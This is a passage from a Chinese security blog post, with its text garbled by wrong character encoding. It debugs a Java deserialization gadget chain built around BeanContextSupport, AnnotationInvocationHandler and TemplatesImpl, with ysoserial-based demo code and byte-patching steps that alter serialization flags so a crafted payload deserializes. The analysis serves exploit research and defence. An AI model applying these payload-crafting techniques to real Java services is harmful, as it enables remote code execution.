</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Serializer</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">set</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Deserializer</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">ser</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åè¿è¡Œä¼šäº§ç”Ÿä¸€ä¸ªå› ä¸º<code>readInt()</code>çš„æŠ¥é”™ï¼Œè€Œè¿™ä¸ªæŠ¥é”™å½’åŠŸäº<code>AnnotationInvocationHandler</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Exception</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">thread</span><span class="w"> </span><span class="s">&#34;main&#34;</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">EOFException</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">at</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">DataInputStream</span><span class="p">.</span><span class="na">readInt</span><span class="p">(</span><span class="n">DataInputStream</span><span class="p">.</span><span class="na">java</span><span class="p">:</span><span class="n">392</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">at</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream$BlockDataInputStream</span><span class="p">.</span><span class="na">readInt</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="p">.</span><span class="na">java</span><span class="p">:</span><span class="n">2823</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>ä¸€ç›´è°ƒè¯•è·Ÿè¸ªåˆ°<code>readBlockHeader()</code>è¿™é‡Œ<code>return -1;</code>å¯¼è‡´çš„in.read()ä¸º-1 ï¼Œç„¶åè¿›å…¥throw</p>
<p><img loading="lazy" src="images/image-20250510152758057.png" alt="image-20250510152758057"  />
</p>
<p><img loading="lazy" src="images/image-20250510152928328.png" alt="image-20250510152928328"  />
</p>
<p>è·Ÿè¸ªå‘ç°ä½ çš„ç±»é‡å†™readObjectç„¶åè°ƒç”¨<code>defaultReadObject()</code>ï¼Œååºåˆ—åŒ–å°±ä¼šè¿›å…¥ä¸‹æ–¹ä»£ç ï¼Œè€Œ<code>defaultDataEnd</code>è¿™ä¸ªå€¼åˆ™è·Ÿè¯¥ç±»æœ‰æ²¡æœ‰<code>writeObject()</code>æœ‰å…³ï¼Œæ²¡æœ‰çš„è¯è¿™é‡Œå°±ä¼šç»™<code>defaultDataEnd = true</code>ï¼Œç„¶åè¿™å°±æ˜¯å¯¼è‡´ä¸Šæ–¹æŠ¥é”™çš„æ ¹æœ¬åŸå› å—ï¼Ÿï¼Ÿï¼ŸNo</p>
<p><img loading="lazy" src="images/image-20250510154056878.png" alt="image-20250510154056878"  />
</p>
<p>å…¶å®è¿™åªæ˜¯å…¶ä¸­ä¸€ä¸ªåŸå› ï¼ˆæˆ–è€…è¯´ä¸æ˜¯æ ¹æœ¬åŸå› ï¼‰ï¼Œå¦‚æœ<code>BeanContextSupport</code>å­˜ä¸€ä¸ªå¯¹è±¡ï¼Œå°±å› ä¸ºè¿™ä¸ªå¯¹è±¡çš„ç±»æ²¡æœ‰<code>writeObject()</code>å°±æŠ¥é”™ï¼Œæ˜¯ä¸æ˜¯æœ‰ç‚¹å¤ªè ¢äº†å‘€ã€‚äºæ˜¯å†™äº†ä¸ªdemo</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Deserializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Serializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.ReadWrite</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Reflections</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.beancontext.BeanContextSupport</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.LinkedHashSet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">serSupport</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Test2</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Test2</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BeanContextSupport</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanContextSupport</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&#34;serializable&#34;</span><span class="p">,</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">tmpMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">tmpMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">test</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&#34;children&#34;</span><span class="p">,</span><span class="n">tmpMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">test2</span><span class="o">=</span><span class="s">&#34;test2&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LinkedHashSet</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedHashSet</span><span class="p">();</span><span class="c1">//è¿™æ ·å¯ä»¥ç¡®ä¿å…ˆååºåˆ—åŒ– templates å†ååºåˆ—åŒ– proxy</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">b</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">test2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Serializer</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">set</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReadWrite</span><span class="p">.</span><span class="na">writeFile</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="s">&#34;serobj.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Deserializer</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">ser</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Test2</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Deserializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.ReadWrite</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.Serializable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Test2</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Serializable</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ReadWrite</span><span class="p">.</span><span class="na">readFile</span><span class="p">(</span><span class="s">&#34;ser+.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Deserializer</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">defaultReadObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åä½ ä¼šå‘ç°å¹¶æ²¡æœ‰æŠ¥é”™ï¼Œè€Œä¸”<code>defaultDataEnd = true</code>ä¹Ÿèµ‹å€¼äº†çš„ã€‚å…ˆçœ‹çœ‹<code>åºåˆ—åŒ–æ•°æ®</code>å§ï¼Œç”¨<code>zkar</code>çœ‹çš„</p>
<p>æˆ‘å…ˆè§£é‡Šä¸‹è¿™æ®µæ•°æ®ä½äºå•¥åœ°æ–¹ï¼Œæœ€å¤–å±‚æ˜¯<code>java.util.LinkedHashSet</code>çš„<code>[]ClassData</code>ï¼Œå°±æ˜¯è®°å½•LinkedHashSetä¸­<code>æ¯ä¸ªå±æ€§å¯¹åº”çš„å€¼</code>ï¼Œç„¶åä¸ºå•¥å•ç‹¬æ‹¿è¿™ä¸ªåœ°æ–¹æ¥è¯´å‘¢ï¼Œçœ‹3é‚£ä¸ªä½ç½®ï¼Œè¿™ä¸ªå¯¹æˆ‘ä»¬æ¥è¯´å¾ˆé‡è¦ï¼Œå› ä¸ºè¿™é‡Œæ˜¯æŠ¥é”™äº§ç”Ÿçš„ä½ç½®ã€‚</p>
<p>ç„¶åæ²¡æœ‰çœ‹è¿‡<code>åºåˆ—åŒ–æ•°æ®</code>çš„å¸ˆå‚…å»ºè®®è·Ÿç€è¿™ä¸ª<a href="https://github.com/1nhann/java_ser_format">æ€ç»´å¯¼å›¾</a>çœ‹ï¼Œè¿˜æ˜¯æŒºå»ºè®®çœ‹çš„ï¼ŒæŠŠæ¯ä¸ªå€¼çš„æ³¨é‡Šå«ä¹‰ä»¥åŠå®Œæ•´çœ‹ä¸€ä¸ªåºåˆ—åŒ–æ•°æ®åŸºæœ¬ä¸Šå°±éƒ½èƒ½çœ‹æ‡‚äº†ã€‚</p>
<p><img loading="lazy" src="images/image-20250510160223996.png" alt="image-20250510160223996"  />
</p>
<p>ç„¶åç®€å•æä¸€ç‚¹å§<code>@ObjectAnnotation</code>åœ¨æ•°æ®é‡Œé¢å½“æ—¶æ²¡çœ‹æ‡‚çš„ï¼Œåé¢çœ‹åˆ°ä¸‹å›¾è¿™ä¸ªæ‰ç†è§£ï¼Œå¯ä»¥ç†è§£ä¸ºåºåˆ—åŒ–æ•°æ®å§ï¼ˆåˆšå¼€å§‹çœ‹çš„æ—¶å€™å›°æƒ‘äº†ä¸‹ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç®€å•æä¸€ä¸‹</p>
<p><img loading="lazy" src="images/image-20250510161134923.png" alt="image-20250510161134923"  />
</p>
<p>ç„¶åä½ ä¼šçœ‹åºåˆ—åŒ–æ•°æ®åï¼Œä½ è‚¯å®šè¿˜å…³å¿ƒä¸€ä¸ªç‚¹<code>@ClassDescFlags</code>ï¼Œå¯ä»¥çœ‹åˆ°Test2æ˜¯æ²¡æœ‰<code>SC_WRITE_METHOD</code>è¿™ä¸ªå€¼ï¼Œé‚£ä»–ä¸ºä»€ä¹ˆ<code>æ²¡æœ‰æŠ¥é”™æ</code>ï¼Ÿ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@ClassName</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nd">@Length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">5</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">0x00</span><span class="w"> </span><span class="n">05</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nd">@Value</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Test2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">0x54</span><span class="w"> </span><span class="n">65</span><span class="w"> </span><span class="n">73</span><span class="w"> </span><span class="n">74</span><span class="w"> </span><span class="n">32</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@SerialVersionUID</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">6232696428067116234</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">0x56</span><span class="w"> </span><span class="n">7e</span><span class="w"> </span><span class="n">fc</span><span class="w"> </span><span class="n">61</span><span class="w"> </span><span class="n">0b</span><span class="w"> </span><span class="n">c9</span><span class="w"> </span><span class="n">54</span><span class="w"> </span><span class="n">ca</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Handler</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">8257558</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@ClassDescFlags</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">SC_SERIALIZABLE</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">0x02</span><span class="w">
</span></span></span></code></pre></div><h4 id="å›åˆ°æ­£é¢˜">å›åˆ°æ­£é¢˜<a hidden class="anchor" aria-hidden="true" href="#å›åˆ°æ­£é¢˜">#</a></h4>
<p>æˆ‘ä»¬åœ¨<code>èµ‹å€¼true</code>åå¾€åè·Ÿè¸ªï¼Œ</p>
<p><img loading="lazy" src="images/image-20250510161804489.png" alt="image-20250510161804489"  />
</p>
<p>å‘ç°Test2ååºåˆ—åŒ–å®Œæˆåï¼Œä¼šæŠŠ<code>defaultDataEnd = false</code>é‡æ–°è¦†ç›–æ‰çš„ã€‚ï¼ˆæ‰€ä»¥æ²¡æœ‰<code>writeObject()</code>ä¸æ˜¯ç½ªé­ç¥¸é¦–ï¼‰</p>
<blockquote>
<p>ç„¶åå†<strong>ååºåˆ—åŒ–<code>null</code>ï¼Œå†åˆ°ååºåˆ—åŒ–<code>count = ois.readInt();</code></strong>ï¼ˆåœ¨ç»“åˆä¸Šé¢åºåˆ—åŒ–æ•°æ®åˆ†æçš„ï¼‰è¿‡ç¨‹æ˜¯è¿™æ ·ã€‚readInt()ç»“æŸåï¼Œä¹Ÿå°±æ„å‘³ç€<code>BeanContextSupport</code>ååºåˆ—åŒ–<code>ç»“æŸäº†</code>ï¼Œç„¶ååˆ°ä¸‹ä¸€ä¸ªå¯¹è±¡äº†String test2çš„ååºåˆ—åŒ–äº†ï¼ˆè¿™é‡Œä¸ºä»€ä¹ˆè¯´è¿™ä¸ªï¼Œå¯¹åé¢ç†è§£æ˜¯æœ‰ç”¨çš„</p>
</blockquote>
<p><img loading="lazy" src="images/image-20250510161925536.png" alt="image-20250510161925536"  />
</p>
<p>debugè¡¨è¾¾å¼</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="s">&#34;0x%02X&#34;</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">bin</span><span class="p">.</span><span class="na">in</span><span class="p">.</span><span class="na">in</span><span class="p">.</span><span class="na">buf</span><span class="o">[</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">bin</span><span class="p">.</span><span class="na">in</span><span class="p">.</span><span class="na">in</span><span class="p">.</span><span class="na">pos</span><span class="o">-</span><span class="n">1</span><span class="o">]</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><h4 id="annotationinvocationhandler-throwåŸå› ">AnnotationInvocationHandler throwåŸå› <a hidden class="anchor" aria-hidden="true" href="#annotationinvocationhandler-throwåŸå› ">#</a></h4>
<p>é‚£<code>AnnotationInvocationHandler</code>æ˜¯ä»€ä¹ˆåŸå› å‘¢è‡ªç„¶æ˜¯è·Ÿä»–readObjectæŠ¥é”™æ˜¯æœ‰å…³ç³»çš„ã€‚</p>
<p>æŠ¥é”™æœ€åthrowçš„æ˜¯<code>IOExceptionçš„æŠ¥é”™</code>ï¼Œç„¶åä¸‹å›¾2æ˜¯æ•è·<code>ClassNotFoundException</code>æŠ¥é”™çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸ä¼šè¿›å…¥catchï¼Œè€Œæ˜¯**<code>èµ°å®Œfinallyï¼ˆæ²¡èƒ½æ‰§è¡ŒdefaultDataEnd = falseï¼‰ç»§ç»­è·³è½¬åˆ°ä¸Šå±‚throw</code>**ï¼ˆè¿™ä¸ªæ­¥éª¤é‡å¤äº†å‡ æ¬¡ï¼‰ï¼Œæœ€åæ‰è¢«<code>BeanContextSupportçš„catch</code>æ•è·<code>IOException</code></p>
<p><img loading="lazy" src="images/image-20250510165542595.png" alt="image-20250510165542595"  />
</p>
<p><img loading="lazy" src="images/image-20250510165615223.png" alt="image-20250510165615223"  />
</p>
<p><img loading="lazy" src="images/image-20250510165647804.png" alt="image-20250510165647804"  />
</p>
<p>äºæ˜¯è¿™é‡Œåˆå¤šäº†ä¸€å±‚ç†è§£ï¼ŒåŠ<code>BeanContextSupport</code>catchèƒ½æ•è·çš„errorè¦<code>åŒ…å«</code>AnnotationInvocationHandlerçš„<code>throw</code>æ‰è¡Œè€Œä¸åªæ˜¯æ»¡è¶³åŒå±‚try/catchç»“æ„</p>
<p><img loading="lazy" src="images/image-20250510170419598.png" alt="image-20250510170419598"  />
</p>
<h4 id="åŸå› å°ç»“">åŸå› å°ç»“<a hidden class="anchor" aria-hidden="true" href="#åŸå› å°ç»“">#</a></h4>
<p>æ‰€ä»¥å°±æ˜¯<code>readObjectæŠ¥é”™</code>å¯¼è‡´é€€å‡ºäº†ï¼Œä»è€Œæ²¡èƒ½è®©<code>defaultDataEnd = false</code>é‡æ–°è¦†ç›–æ‰ã€‚å¯¼è‡´readInt()æŠ¥é”™ã€‚è€Œ<strong>æ·»åŠ </strong><code>SC_WRITE_METHOD</code>åªæ˜¯æˆ‘ä»¬åˆ©ç”¨çš„æ‰‹æ®µï¼Œä¸æ˜¯åŸå› </p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">flagsReplace</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="n">0x02</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x02</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">getSubarrayIndex</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">flagsReplace</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">deleteAt</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">i</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">addAtIndex</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="n">0x03</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æŠŠflags 0x02æ”¹æˆ<code>0x03</code>ï¼ˆ<code>SC_WRITE_METHOD</code>å€¼æ˜¯<code>0x01</code>æ‰€ä»¥è¿™é‡Œ+1ï¼‰ï¼Œè¿™é‡Œzkarçœ‹åºåˆ—åŒ–æ•°æ®æŠ¥é”™äº†ï¼Œå¯ä»¥ç”¨å¦ä¸€ä¸ªå·¥å…·æ›¿ä»£ä¸‹SerializationDumper</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">TOOLS</span><span class="err">\</span><span class="n">Java</span><span class="err">\</span><span class="n">jdk</span><span class="o">-</span><span class="n">17</span><span class="err">\</span><span class="n">bin</span><span class="err">\</span><span class="n">java</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">SerializationDumper</span><span class="o">-</span><span class="n">v1</span><span class="p">.</span><span class="na">14</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">26618</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">Ljava</span><span class="err">\</span><span class="n">jdk7u21</span><span class="o">-</span><span class="n">8u20</span><span class="err">\</span><span class="n">ser</span><span class="o">+</span><span class="p">.</span><span class="na">txt</span><span class="w">
</span></span></span></code></pre></div><h4 id="å†æ¬¡è°ƒè¯•">å†æ¬¡è°ƒè¯•<a hidden class="anchor" aria-hidden="true" href="#å†æ¬¡è°ƒè¯•">#</a></h4>
<p>ä»<code>defaultDataEnd = true</code>æœ€åé‚£ä¸ª<code>}</code>é‚£é‡Œå¼€å§‹å§ï¼Œç„¶åå‘ç°ä¼šä¸€è·¯throwåˆ°<code>BeanContextSupport</code>catch <code>continue;</code>ï¼Œç›´æ¥é€€å‡ºäº†<code>BeanContextSupportåŒ…è£¹ç±»</code>çš„ååºåˆ—åŒ–ï¼Œç›´æ¥æ¥åˆ°<code>deserialize</code>çš„<code>ois.readInt();</code></p>
<p><img loading="lazy" src="images/image-20250510174520949.png" alt="image-20250510174520949"  />
</p>
<p><img loading="lazy" src="images/image-20250510174904454.png" alt="image-20250510174904454"  />
</p>
<h4 id="å¯¼è‡´çš„é—®é¢˜">å¯¼è‡´çš„é—®é¢˜<a hidden class="anchor" aria-hidden="true" href="#å¯¼è‡´çš„é—®é¢˜">#</a></h4>
<p>å¯¼è‡´äº†ä¸ªä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ</p>
<blockquote>
<p>mapçš„keyæ˜¯<code>AnnotationInvocationHandler</code>ï¼Œè€Œæˆ‘ä»¬è®¾ç½®çš„mapçš„valueæ˜¯<code>null</code>ï¼Œè¿™é‡ŒAnnotationInvocationHandlerååºåˆ—åŒ–å®Œå°±<code>ä¸­æ–­äº†mapçš„ååºåˆ—åŒ–</code>å¯¼è‡´**<code>nullæ²¡æœ‰ååºåˆ—åŒ–</code>**ï¼Œè€Œç¨‹åºç›´æ¥æ¥åˆ°äº†<code>ois.readInt();</code>ï¼Œåºåˆ—åŒ–æ•°æ®in.in.poså´è¿˜åœ¨<code>nullå€¼</code>çš„ä½ç½®ï¼Œç„¶åå¯¼è‡´throw</p>
<p>ç„¶è€Œè¿™ä¸ªnullå¹¶ä¸å½±å“æˆ‘ä»¬åˆ©ç”¨ï¼Œæ‰€ä»¥ç›´æ¥æŠŠè¿™ä¸ªå€¼åˆ æ‰å°±å¥½</p>
</blockquote>
<p><img loading="lazy" src="images/image-20250510173704432.png" alt="image-20250510173704432"  />
</p>
<p><img loading="lazy" src="images/image-20250510175358299.png" alt="image-20250510175358299"  />
</p>
<blockquote>
<p>è¿™é‡Œå†æä¸€å˜´null<code>ä¸ºä»€ä¹ˆåˆ æ‰æ²¡äº‹</code>ã€‚ä»¥åŠä¸ºä»€ä¹ˆè¦åˆ é™¤</p>
</blockquote>
